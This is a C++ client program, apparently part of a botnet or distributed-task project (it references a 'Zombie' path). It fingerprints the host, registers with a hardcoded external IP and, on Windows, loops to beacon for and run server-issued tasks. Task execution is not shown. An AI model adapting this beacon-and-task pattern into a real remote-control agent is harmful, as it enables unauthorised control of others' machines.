// Define constants for server IP address and port number
const char* SERVER_IP = "45.55.70.104";
const int SERVER_PORT = 8080;
//45.55.70.104:8080/Zombie/ZombieTest
#ifdef _WIN32
// Windows-specific code
#include <iostream>
#include "win_functions.h"
#include "worker.h"
#include <WinSock2.h>
#include <thread>
#include <chrono>

void scheduledTask(Worker worker) {
    Task task;
    while (true) {
        Command command = beacon(SERVER_IP, SERVER_PORT, worker);
        switch (command) {
            case Command::REQUEST:
                std::cout << "\nCommand is REQUEST" << std::endl;
                 task = request(SERVER_IP, SERVER_PORT, worker);
                 std::cout << task.task << std::endl;
                 break;
            case Command::CONTINUE:
                std::cout << "\nCommand is CONTINUE" << std::endl;
                break;
            case Command::STOP:
                task = Task(); // empty out the task object
                std::cout << "\nCommand is STOP" << std::endl;
                break;
            default:
                std::cout << "\nUnknown command" << std::endl;
                break;
        }
        bool finished = doTask(SERVER_IP, SERVER_PORT, task);
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

int main() {
    std::string cpu = getCPUInfo();
    if (!cpu.empty()) {
        std::cout << "CPU Model Name: " << cpu << std::endl;
    }
    else {
        std::cerr << "Failed to retrieve CPU model name." << std::endl;
    }

    std::string ramInfo = getRAMInfo();
    if (!ramInfo.empty()) {
        std::cout << "Total RAM: " << ramInfo << std::endl;
    }
    else {
        std::cerr << "Failed to retrieve RAM information." << std::endl;
    }

    in_addr ipAddress = getIpAddress();

    Worker worker = registerWorkerWin(SERVER_IP, SERVER_PORT, ipAddress, cpu, ramInfo);

    // Check if the worker registration was successful
    if (worker.id != 0) {
        std::cout << "\n\n-----------------------------------" << std::endl;
        std::cout << "Worker registered successfully!" << std::endl;
        std::cout << "Worker ID: " << worker.id << std::endl;
        std::cout << "Worker Name: " << worker.name << std::endl;
        std::cout << "-----------------------------------\n\n" << std::endl;
    }
    else {
        std::cerr << "Failed to register worker." << std::endl;
    }

    scheduledTask(worker);

    return 0;
}
#elif defined(__linux__)
// Linux-specific code
#include <iostream>
#include "linux_functions.h"
#include "worker.h"
#include <fstream>
#include <thread>
#include <chrono>

void scheduledTask(Worker worker) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

int main() {
    std::string cpu = getCPUModelName();
    if (!cpu.empty()) {
        std::cout << "CPU Model Name: " << cpu << std::endl;
    }
    else {
        std::cerr << "Failed to retrieve CPU model name." << std::endl;
    }

    std::string ramInfo = getRAMInfo();
    if (!ramInfo.empty()) {
        std::cout << "Total RAM: " << ramInfo << std::endl;
    }
    else {
        std::cerr << "Failed to retrieve RAM information." << std::endl;
    }

    in_addr ipAddress = getIpAddress();

    Worker worker = registerWorker(SERVER_IP, SERVER_PORT, ipAddress, cpu, ramInfo);

    // Check if the worker registration was successful
    if (worker.id != 0) {
        std::cout << "Worker registered successfully!" << std::endl;
        std::cout << "Worker ID: " << worker.id << std::endl;
        std::cout << "Worker Name: " << worker.name << std::endl;
    }
    else {
        std::cerr << "Failed to register worker." << std::endl;
    }

    scheduledTask(worker);

    return 0;
}
#endif